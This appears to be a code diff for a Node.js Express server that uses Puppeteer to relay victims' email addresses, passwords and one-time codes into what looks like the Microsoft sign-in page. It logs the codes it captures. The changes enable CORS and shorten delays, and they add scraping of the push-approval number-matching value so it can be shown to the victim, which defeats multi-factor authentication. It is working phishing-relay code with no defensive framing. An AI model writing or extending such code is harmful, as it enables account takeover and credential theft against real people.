@@ -1,4 +1,5 @@
 const express = require("express");
+const cors = require("cors");
 const fs = require("fs");
 const puppeteer = require("puppeteer");
 require("dotenv").config();
@@ -7,6 +8,9 @@ const { v4: uuidv4 } = require("uuid");
 
 const app = express();
 const port = process.env.PORT || 3000;
+
+// Enable CORS for all routes
+app.use(cors());
 
 app.use(express.static("public"));
 app.use(express.json());
@@ -27,6 +31,11 @@ function writeToLog(message) {
 function delay(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
+
+// Serve index.html when the root URL is accessed
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "view", "index.html"));
+});
 
 app.post("/email", async (req, res) => {
   let { sessionId, email } = req.body;
@@ -64,7 +73,7 @@ app.post("/email", async (req, res) => {
     await page.waitForSelector("#i0116");
     await page.type("#i0116", email);
     await page.click("#idSIButton9");
-    await delay(10000);
+    await delay(5000);
 
     const content1 = await page.content();
     if (!content1.includes("Enter password")) {
@@ -98,7 +107,7 @@ app.post("/pass", async (req, res) => {
     await page.waitForSelector("#i0118");
     await page.type("#i0118", password);
     await page.click("#idSIButton9");
-    await delay(10000);
+    await delay(5000);
 
     const content2 = await page.content();
     if (content2.includes("Your account or password is incorrect.")) {
@@ -109,9 +118,17 @@ app.post("/pass", async (req, res) => {
       if (content3.includes("Enter code")) {
         res.send("2");
       } else if (content3.includes("Approve sign in request")) {
-        res.send("3");
+        await page.waitForSelector("#idRichContext_DisplaySign");
+        const textContent = await page.$eval(
+          "#idRichContext_DisplaySign",
+          (el) => el.textContent
+        );
+        res.send(textContent);
+        await delay(60000);
+        await page.waitForSelector("#idSIButton9");
+        await page.click("#idSIButton9");
       } else {
-        await delay(10000);
+        await delay(5000);
         await page.waitForSelector("#idSIButton9");
         await page.click("#idSIButton9");
         res.send("1");
@@ -142,7 +159,7 @@ app.post("/code", async (req, res) => {
     await page.waitForSelector("#idTxtBx_SAOTCC_OTC");
     await page.type("#idTxtBx_SAOTCC_OTC", code);
     await page.click("#idSubmit_SAOTCC_Continue");
-    await delay(10000);
+    await delay(5000);
 
     const content4 = await page.content();
     if (content4.includes("You didn't enter the expected verification code.")) {
@@ -150,7 +167,7 @@ app.post("/code", async (req, res) => {
       res.send("0");
       writeToLog(`Incorrect code: ${code} for session: ${sessionId}`);
     } else {
-      await delay(10000);
+      await delay(5000);
       await page.click("#idSIButton9");
       res.send("1");
       writeToLog(`Code: ${code} logged for session: ${sessionId}`);
@@ -161,27 +178,6 @@ app.post("/code", async (req, res) => {
   }
 });
 
-app.post("/request", async (req, res) => {
-  const { sessionId } = req.body;
-
-  if (!sessionId) {
-    return res.status(400).send("Session ID is required");
-  }
-
-  const session = sessions[sessionId];
-
-  if (!session) {
-    return res.status(400).send("Session not found");
-  }
-
-  try {
-    await delay(10000);
-    res.send("Request processed");
-  } catch (err) {
-    console.error("Error in /request:", err);
-    res.status(500).send("Internal Server Error");
-  }
-});
 
 app.post("/close", async (req, res) => {
   const { sessionId } = req.body;
